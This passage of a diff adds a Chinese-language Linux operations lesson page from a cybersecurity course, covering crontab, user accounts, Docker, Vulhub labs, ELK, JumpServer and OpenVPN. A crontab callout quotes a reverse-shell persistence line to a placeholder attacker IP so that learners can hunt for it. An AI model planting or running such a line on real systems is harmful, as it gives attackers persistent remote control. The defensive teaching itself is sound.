+            <div class="quiz-opt" onclick="checkQ(this,true)"><span class="quiz-opt-key">C</span>750</div>
+            <div class="quiz-opt" onclick="checkQ(this,false)"><span class="quiz-opt-key">D</span>755</div>
+          </div>
+          <div class="quiz-exp">正確！拆解：rwx=7，r-x=5，---=0，合起來是 750。Owner（rwx）= r(4)+w(2)+x(1) = 7，Group（r-x）= r(4)+w(0)+x(1) = 5，Others（---）= 0+0+0 = 0，所以是 750。</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L6-3  crontab -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l6-3">
+        <h2>crontab 定時任務</h2>
+        <p>crontab 是 Linux 的定時任務調度工具，可以設定在特定時間自動執行命令或腳本。在資安中，攻擊者常利用 crontab 設置持久化後門。</p>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">crontab 語法與使用</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># crontab 格式：
+# 分鐘 小時 日期 月份 星期 命令
+# 0-59  0-23  1-31 1-12  0-7
+# *（每）, ,（枚舉）, -（範圍）, /（間隔）</span>
+
+<span class="comment"># 編輯當前用戶的定時任務</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">crontab</span> <span class="flag">-e</span>
+
+<span class="comment"># 常用範例：</span>
+* * * * * /script.sh               <span class="comment">← 每分鐘執行</span>
+0 2 * * * /backup.sh               <span class="comment">← 每天凌晨 2:00 執行</span>
+0 */6 * * * /check.sh              <span class="comment">← 每 6 小時執行一次</span>
+30 8 * * 1-5 /reminder.sh          <span class="comment">← 週一到週五 8:30 執行</span>
+0 0 1 * * /monthly_report.sh       <span class="comment">← 每月 1 號午夜執行</span>
+
+<span class="comment"># 查看當前用戶的定時任務</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">crontab</span> <span class="flag">-l</span>
+
+<span class="comment"># 查看系統級定時任務</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="path">/etc/crontab</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ls</span> <span class="path">/etc/cron.d/</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">ls</span> <span class="path">/etc/cron.daily/</span>
+</div>
+        </div>
+
+        <div class="callout danger">
+          <div class="callout-label">後門持久化排查</div>
+          <p>入侵排查時，必須檢查所有定時任務！攻擊者常用 <code>* * * * * bash -i >& /dev/tcp/攻擊者IP/4444 0>&1</code> 這類反彈 Shell 命令設置 crontab 後門，實現持久化控制。排查命令：<code>crontab -l</code>（當前用戶）、<code>cat /etc/crontab</code>（系統）、<code>ls /etc/cron.d/ /var/spool/cron/</code>（所有用戶）。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L6-4  用戶管理 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l6-4">
+        <h2>Linux 用戶管理</h2>
+        <p>Linux 的用戶管理是系統安全的基礎。每個用戶有唯一的 UID，每個群組有唯一的 GID。理解用戶系統，有助於進行權限提升分析和後門帳號排查。</p>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">用戶與群組管理命令</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment">===== 用戶管理 =====</span>
+<span class="comment"># 創建新用戶</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">useradd</span> <span class="path">alice</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">useradd</span> <span class="flag">-m -s /bin/bash -u 1001</span> <span class="path">bob</span>
+
+<span class="comment"># 設定密碼</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">passwd</span> <span class="path">alice</span>
+
+<span class="comment"># 修改用戶（加入 sudo 群組）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">usermod</span> <span class="flag">-aG wheel</span> <span class="path">alice</span>
+<span class="comment"># CentOS 的 sudo 群組是 wheel，Ubuntu 是 sudo</span>
+
+<span class="comment"># 刪除用戶（-r 同時刪除 home 目錄）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">userdel</span> <span class="flag">-r</span> <span class="path">alice</span>
+
+<span class="comment">===== 用戶資訊查詢 =====</span>
+<span class="comment"># 查看用戶信息</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">id</span> <span class="path">alice</span>
+<span class="out">uid=1001(alice) gid=1001(alice) groups=1001(alice),10(wheel)</span>
+
+<span class="comment"># 查看所有用戶</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="path">/etc/passwd</span>
+<span class="out">root:x:0:0:root:/root:/bin/bash     ← UID=0 是 root</span>
+<span class="out">alice:x:1001:1001::/home/alice:/bin/bash</span>
+
+<span class="comment"># 排查 UID=0 的非 root 帳號（潛在後門！）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">awk</span> <span class="flag">-F:</span> <span class="str">'$3==0 {print}'</span> <span class="path">/etc/passwd</span>
+
+<span class="comment"># 查看誰可以執行 sudo（應急排查）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="path">/etc/sudoers</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">grep</span> <span class="flag">-v</span> <span class="str">"^#"</span> <span class="path">/etc/sudoers</span> | <span class="cmd">grep</span> <span class="flag">-v</span> <span class="str">"^$"</span>
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L6-5  系統命令 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l6-5">
+        <h2>常用系統命令彙總</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">系統管理常用命令</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 系統信息</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">uname</span> <span class="flag">-a</span>       <span class="comment"># 系統版本、核心版本</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="path">/etc/redhat-release</span>  <span class="comment"># CentOS 版本</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">lscpu</span>             <span class="comment"># CPU 信息</span>
+
+<span class="comment"># 磁碟與記憶體</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">df</span> <span class="flag">-h</span>             <span class="comment"># 磁碟使用量</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">du</span> <span class="flag">-sh</span> <span class="path">/var/log</span>  <span class="comment"># 某目錄大小</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">free</span> <span class="flag">-h</span>           <span class="comment"># 記憶體使用量</span>
+
+<span class="comment"># 服務管理（systemd）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">list-units --type=service</span>  <span class="comment"># 列出所有服務</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">status</span> nginx
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">start|stop|restart|enable|disable</span> nginx
+
+<span class="comment"># 軟體包安裝（CentOS）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum install</span> <span class="flag">-y</span> <span class="path">wget curl vim net-tools</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum update</span> <span class="flag">-y</span>   <span class="comment"># 更新所有套件</span>
+
+<span class="comment"># 防火牆管理（firewalld）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">firewall-cmd</span> <span class="flag">--list-all</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">firewall-cmd</span> <span class="flag">--permanent --add-port=80/tcp</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">firewall-cmd</span> <span class="flag">--reload</span>
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L7-1  Docker 概念 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l7-1">
+        <h2>Docker 概念與安裝</h2>
+        <p>Docker 是一個容器化平台，讓應用程式及其依賴項可以打包成「映像（Image）」，在任何環境中一致地運行。對於資安工程師，Docker 的最大價值是<strong>快速搭建漏洞靶場環境</strong>（如 Vulhub）。</p>
+
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">映像 (Image)</div>
+            <div class="term-def">只讀的模板，包含應用程式及其所有依賴項。類似虛擬機的快照。從映像創建出容器。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">容器 (Container)</div>
+            <div class="term-def">映像的運行實例。可以啟動、停止、刪除。容器是隔離的進程，共享宿主機的作業系統核心。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">Registry</div>
+            <div class="term-def">映像倉庫，默認是 Docker Hub（hub.docker.com）。Vulhub 的所有漏洞環境映像都存放在此。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">Dockerfile</div>
+            <div class="term-def">定義映像如何建構的腳本文件，描述基礎映像、安裝什麼軟體、複製什麼文件、執行什麼命令。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">Docker 安裝（CentOS 7）</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 移除舊版 Docker</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum remove</span> docker docker-common docker-selinux docker-engine
+
+<span class="comment"># 安裝必要工具</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum install</span> <span class="flag">-y</span> yum-utils device-mapper-persistent-data lvm2
+
+<span class="comment"># 添加 Docker 源（阿里雲鏡像）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum-config-manager</span> <span class="flag">--add-repo</span> https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
+
+<span class="comment"># 安裝 Docker CE</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">yum install</span> <span class="flag">-y</span> docker-ce docker-ce-cli containerd.io
+
+<span class="comment"># 啟動並設定開機啟動</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">enable --now</span> docker
+
+<span class="comment"># 驗證安裝</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker</span> <span class="flag">--version</span>
+<span class="ok">Docker version 24.0.7, build afdd53b</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker</span> <span class="flag">run</span> hello-world
+<span class="ok">Hello from Docker!</span>
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L7-2  Docker 映像操作 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l7-2">
+        <h2>Docker 映像操作命令</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">Docker 映像管理</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 搜尋映像</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker search</span> nginx
+
+<span class="comment"># 拉取映像（從 Docker Hub 下載）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker pull</span> nginx<span class="flag">:latest</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker pull</span> ubuntu<span class="flag">:22.04</span>
+
+<span class="comment"># 列出本地映像</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker images</span>
+<span class="out">REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
+nginx        latest    a6bd71f48f68   2 weeks ago    187MB
+ubuntu       22.04     3b418d7b466a   4 weeks ago    69.2MB</span>
+
+<span class="comment"># 刪除映像</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker rmi</span> nginx<span class="flag">:latest</span>
+
+<span class="comment"># 導出映像到文件（離線傳輸）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker save</span> <span class="flag">-o</span> nginx.tar nginx:latest
+
+<span class="comment"># 從文件載入映像</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker load</span> <span class="flag">-i</span> nginx.tar
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L7-3  容器操作 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l7-3">
+        <h2>容器操作與重啟策略</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">Docker 容器管理命令</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 運行容器（-d 後台運行，-it 互動終端）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-d</span> <span class="flag">--name webserver</span> nginx
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-it</span> ubuntu:22.04 <span class="path">/bin/bash</span>
+
+<span class="comment"># 設定重啟策略（伺服器重啟後自動啟動容器）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-d --restart=always</span> <span class="flag">--name webserver</span> nginx
+<span class="comment"># --restart=no（默認）/ on-failure / unless-stopped / always</span>
+
+<span class="comment"># 查看運行中的容器</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker ps</span>
+
+<span class="comment"># 查看所有容器（包含已停止的）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker ps</span> <span class="flag">-a</span>
+
+<span class="comment"># 停止 / 啟動 / 刪除容器</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker stop</span> webserver
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker start</span> webserver
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker rm</span> webserver          <span class="comment"># 必須先停止</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker rm</span> <span class="flag">-f</span> webserver       <span class="comment"># 強制刪除（不需先停止）</span>
+
+<span class="comment"># 進入運行中的容器</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker exec</span> <span class="flag">-it</span> webserver <span class="path">/bin/bash</span>
+
+<span class="comment"># 查看容器日誌</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker logs</span> <span class="flag">-f</span> webserver
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L7-4  端口映射 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l7-4">
+        <h2>容器端口映射與文件傳遞</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">端口映射 · 數據卷 · 文件傳遞</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 端口映射 -p 宿主機端口:容器端口</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-d -p 8080:80</span> <span class="flag">--name web</span> nginx
+<span class="comment"># 訪問宿主機 IP:8080 即可看到 Nginx 頁面</span>
+
+<span class="comment"># 映射多個端口</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-d -p 8080:80 -p 4443:443</span> nginx
+
+<span class="comment"># 數據卷 -v 宿主機路徑:容器路徑（持久化資料）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-d -p 8080:80 -v /var/www/html:/usr/share/nginx/html</span> nginx
+<span class="comment"># 宿主機的 /var/www/html 掛載到容器的 /usr/share/nginx/html</span>
+
+<span class="comment"># 從宿主機複製文件到容器</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker cp</span> <span class="path">/tmp/index.html web:/usr/share/nginx/html/</span>
+
+<span class="comment"># 從容器複製文件到宿主機</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker cp</span> <span class="path">web:/etc/nginx/nginx.conf /tmp/</span>
+
+<span class="comment"># 快速搭建 Vulhub 漏洞靶場（資安重要！）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">git clone</span> https://github.com/vulhub/vulhub.git
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cd</span> <span class="path">vulhub/struts2/s2-045</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker-compose up</span> <span class="flag">-d</span>
+<span class="comment"># 三行命令即可啟動 Struts2 S2-045 漏洞環境！</span>
+</div>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-label">Vulhub — 最重要的靶場工具</div>
+          <p>Vulhub 是一個基於 Docker-Compose 的開源漏洞練習平台，包含數百個真實漏洞環境（Struts2、Log4j、Spring、Redis 等）。只需 2 條命令即可啟動任何漏洞環境。這將是你在 Stage 4 中進行漏洞複現練習的核心工具。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L8-1  ELK -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l8-1">
+        <h2>ELK 日誌收集系統介紹</h2>
+        <p>ELK 是 <strong>E</strong>lasticsearch + <strong>L</strong>ogstash + <strong>K</strong>ibana 三個開源工具的組合，是企業級日誌收集、分析和視覺化的主流解決方案。</p>
+
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">Elasticsearch</div>
+            <div class="term-def">分散式搜尋與分析引擎，負責儲存和搜尋日誌數據。提供強大的全文搜尋和聚合分析能力。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">Logstash</div>
+            <div class="term-def">數據收集和處理管道，負責從各種來源收集日誌、過濾處理，然後輸出到 Elasticsearch。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">Kibana</div>
+            <div class="term-def">視覺化面板，提供 Web 界面用於搜尋日誌、創建圖表和儀表板，讓日誌分析更直觀。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">Filebeat</div>
+            <div class="term-def">輕量級日誌收集器，部署在各伺服器上採集日誌文件，傳送給 Logstash 或直接給 Elasticsearch。</div>
+          </div>
+        </div>
+
+        <div class="callout tip">
+          <div class="callout-label">資安應用：SIEM 系統基礎</div>
+          <p>ELK 是構建企業 SIEM（安全信息與事件管理）系統的核心組件。透過 ELK，安全團隊可以：集中管理所有伺服器的安全日誌、即時搜尋可疑行為、設置告警規則（如某 IP 登入失敗超過 10 次自動告警）、進行安全事件的溯源分析。</p>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L8-2  ELK 部署 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l8-2">
+        <h2>ELK 部署與 Kibana 視覺化</h2>
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">使用 Docker-Compose 快速部署 ELK</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># docker-compose.yml（ELK Stack）</span>
+<span class="highlight-out">version: '3'
+services:
+  elasticsearch:
+    image: elasticsearch:7.17.0
+    environment:
+      - discovery.type=single-node
+      - ES_JAVA_OPTS=-Xms512m -Xmx512m
+    ports:
+      - "9200:9200"
+    volumes:
+      - es_data:/usr/share/elasticsearch/data
+
+  logstash:
+    image: logstash:7.17.0
+    ports:
+      - "5044:5044"
+    volumes:
+      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
+
+  kibana:
+    image: kibana:7.17.0
+    ports:
+      - "5601:5601"
+    depends_on:
+      - elasticsearch
+
+volumes:
+  es_data:</span>
+
+<span class="comment"># 啟動 ELK</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker-compose up</span> <span class="flag">-d</span>
+
+<span class="comment"># 訪問 Kibana：http://伺服器IP:5601</span>
+<span class="comment"># Elasticsearch API 測試：</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">curl</span> http://localhost:9200/_cluster/health
+<span class="ok">{"cluster_name":"docker-cluster","status":"green",...}</span>
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L9-1  JumpServer -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l9-1">
+        <h2>堡壘機概念與 JumpServer 安裝</h2>
+        <p>堡壘機（Jump Server / Bastion Host）是企業用於統一管理、審計伺服器訪問的安全設備。所有的運維操作必須先登入堡壘機，再由堡壘機連接到目標伺服器，實現訪問控制和操作審計。</p>
+
+        <div class="terms-grid">
+          <div class="term-card">
+            <div class="term-name">訪問控制</div>
+            <div class="term-def">統一管理哪些用戶可以訪問哪些伺服器，不需要將伺服器的帳號密碼分發給每個運維人員。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">操作審計</div>
+            <div class="term-def">記錄所有用戶在伺服器上執行的命令和操作，可回放，滿足合規要求（如等保2.0的審計要求）。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">單點登入</div>
+            <div class="term-def">用戶只需記住堡壘機的帳號密碼，透過堡壘機訪問所有授權的伺服器，無需記憶多個密碼。</div>
+          </div>
+          <div class="term-card">
+            <div class="term-name">JumpServer</div>
+            <div class="term-def">開源堡壘機產品，支持 SSH/RDP/VNC 等多種協議，提供 Web 界面管理，支持雙因素認證（MFA）。</div>
+          </div>
+        </div>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">JumpServer 快速安裝（官方一鍵腳本）</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># JumpServer 官方一鍵安裝腳本</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">curl</span> <span class="flag">-sSL</span> https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh | bash
+
+<span class="comment"># 安裝完成後訪問：http://伺服器IP
+# 默認帳號：admin
+# 默認密碼：ChangeMe（首次登入需修改）</span>
+
+<span class="comment"># 使用 Docker 安裝（推薦用於測試環境）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">docker run</span> <span class="flag">-d \
+  --name jms_all \
+  -v /opt/jumpserver/data:/opt/jumpserver/data \
+  -p 80:80 -p 2222:2222 \
+  --restart=always \</span>
+  jumpserver/jms_all:latest
+</div>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L9-2  JumpServer 配置 -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l9-2">
+        <h2>JumpServer 安全策略配置</h2>
+        <p>JumpServer 安裝完成後，需要進行基本的安全配置才能投入使用。</p>
+        <div class="table-wrap">
+          <table class="dt">
+            <thead><tr><th>配置步驟</th><th>操作說明</th><th>安全意義</th></tr></thead>
+            <tbody>
+              <tr><td>1. 修改默認密碼</td><td>首次登入強制修改 admin 密碼</td><td>防止默認憑證被利用</td></tr>
+              <tr><td>2. 開啟 MFA 雙因素認證</td><td>系統設置 > 開啟 MFA</td><td>即使密碼洩漏也無法登入</td></tr>
+              <tr><td>3. 創建資產（伺服器）</td><td>資產管理 > 資產列表 > 創建資產</td><td>集中管理所有被管伺服器</td></tr>
+              <tr><td>4. 創建系統用戶</td><td>配置伺服器的登入帳號（如 deploy）</td><td>運維人員不需要知道伺服器密碼</td></tr>
+              <tr><td>5. 配置授權規則</td><td>設定哪些用戶可以訪問哪些資產</td><td>最小化權限原則</td></tr>
+              <tr><td>6. 查看操作審計</td><td>審計 > 會話在線 / 歷史會話</td><td>可回放所有操作錄影</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- L10-1  OpenVPN -->
+      <!-- ============================================================ -->
+      <div class="content-block" id="l10-1">
+        <h2>OpenVPN 原理與搭建實戰</h2>
+        <p>OpenVPN 是一個開源的 VPN 解決方案，使用 SSL/TLS 協議加密流量。企業常用 OpenVPN 讓員工在家安全地訪問公司內網。對於資安工程師，理解 VPN 原理也有助於理解 VPN 繞過和隧道技術。</p>
+
+        <div class="terminal">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="td1"></span><span class="td2"></span><span class="td3"></span></div>
+            <span class="terminal-title">OpenVPN 伺服器安裝（CentOS 7）</span>
+            <button class="terminal-copy" onclick="copyTerm(this)">複製</button>
+          </div>
+          <div class="terminal-body">
+<span class="comment"># 使用一鍵安裝腳本（推薦）</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">wget</span> https://git.io/vpn -O openvpn-install.sh
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">bash</span> openvpn-install.sh
+<span class="comment"># 根據提示選擇 IP、端口、DNS，腳本自動完成安裝配置</span>
+<span class="comment"># 生成客戶端配置文件：/root/client.ovpn</span>
+
+<span class="comment"># 查看 OpenVPN 服務狀態</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">systemctl</span> <span class="flag">status</span> openvpn
+
+<span class="comment"># 查看已連接的客戶端</span>
+<span class="prompt">[root@localhost ~]#</span> <span class="cmd">cat</span> <span class="path">/etc/openvpn/openvpn-status.log</span>
+</div>
+        </div>
+
+        <div class="complete-banner">
+          <h3>第二階段完成！</h3>
+          <p>恭喜你完成 Linux 運維基礎的學習！你現在掌握了 Linux 的文件操作、VIM 編輯、權限管理、用戶管理、Docker 容器化，以及 ELK、JumpServer、OpenVPN 等企業級工具。這些技能將貫穿整個資安學習旅程。</p>
+          <div class="btn-row">
+            <a href="stage3.html" class="btn-primary">前往第三階段：網路安全基礎</a>
+            <a href="index.html" class="btn-ghost">返回課程首頁</a>
+            <a href="stage1.html" class="btn-ghost">回顧第一階段</a>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /content-wrap -->
+
+    <!-- NAV BAR -->
+    <div class="lesson-nav">
+      <button class="nav-btn" id="prev-btn" onclick="prevL()" disabled>&#8592; 上一課</button>
+      <div class="nav-info">
+        <div class="nav-counter" id="counter">1 / 28</div>
+        <div class="nav-lesson-title" id="nav-ltitle">網路課程概述與通訊概念</div>
+      </div>
+      <button class="nav-btn primary" id="next-btn" onclick="nextL()">下一課 &#8594;</button>
+    </div>
+
+  </main>
+</div>
+
+<script>
+const LESSONS = [
+  {id:'l1-1',ch:'CH1',title:'Linux 是什麼？為何學 Linux？',time:'15分鐘',type:'基礎概念'},
+  {id:'l1-2',ch:'CH1',title:'VMware 安裝與 Linux 系統安裝',time:'20分鐘',type:'環境搭建'},
+  {id:'l1-3',ch:'CH1',title:'VMware 網路配置與 Xshell 連線',time:'15分鐘',type:'遠端連線'},
+  {id:'l1-4',ch:'CH1',title:'pwd / cd / tree / mkdir 命令',time:'12分鐘',type:'目錄操作'},
+  {id:'l2-1',ch:'CH2',title:'touch / ls 命令詳解',time:'15分鐘',type:'文件操作'},
+  {id:'l2-2',ch:'CH2',title:'cp 複製命令',time:'10分鐘',type:'文件操作'},
+  {id:'l2-3',ch:'CH2',title:'rm 刪除 / mv 移動與重命名',time:'12分鐘',type:'文件操作'},
+  {id:'l3-1',ch:'CH3',title:'Linux 啟動流程與 VIM 介紹',time:'12分鐘',type:'編輯器基礎'},
+  {id:'l3-2',ch:'CH3',title:'VIM 三大模式與基本操作',time:'18分鐘',type:'VIM 實戰'},
+  {id:'l3-3',ch:'CH3',title:'VIM 快捷鍵大全',time:'15分鐘',type:'效率提升'},
+  {id:'l4-1',ch:'CH4',title:'echo / cat / head 命令',time:'12分鐘',type:'文件查看'},
+  {id:'l4-2',ch:'CH4',title:'相對路徑與絕對路徑',time:'8分鐘',type:'路徑概念'},
+  {id:'l4-3',ch:'CH4',title:'Linux 重要目錄結構詳解',time:'20分鐘',type:'系統架構'},
+  {id:'l4-4',ch:'CH4',title:'tail / grep 命令與重定向',time:'18分鐘',type:'日誌分析'},
+  {id:'l5-1',ch:'CH5',title:'Linux 命令總結速查',time:'10分鐘',type:'複習鞏固'},
+  {id:'l5-2',ch:'CH5',title:'file / which / find / xargs',time:'15分鐘',type:'進階搜尋'},
+  {id:'l5-3',ch:'CH5',title:'時間同步與系統命令',time:'15分鐘',type:'系統管理'},
+  {id:'l6-1',ch:'CH6',title:'tar 壓縮解壓縮',time:'12分鐘',type:'文件管理'},
+  {id:'l6-2',ch:'CH6',title:'Linux 權限配置詳解',time:'22分鐘',type:'安全重點'},
+  {id:'l6-3',ch:'CH6',title:'crontab 定時任務',time:'15分鐘',type:'自動化'},
+  {id:'l6-4',ch:'CH6',title:'Linux 用戶管理',time:'18分鐘',type:'帳號安全'},
+  {id:'l6-5',ch:'CH6',title:'常用系統命令彙總',time:'12分鐘',type:'系統管理'},
+  {id:'l7-1',ch:'CH7',title:'Docker 概念與安裝',time:'20分鐘',type:'容器技術'},
+  {id:'l7-2',ch:'CH7',title:'映像操作命令',time:'12分鐘',type:'Docker 操作'},
+  {id:'l7-3',ch:'CH7',title:'容器操作與重啟策略',time:'15分鐘',type:'Docker 操作'},
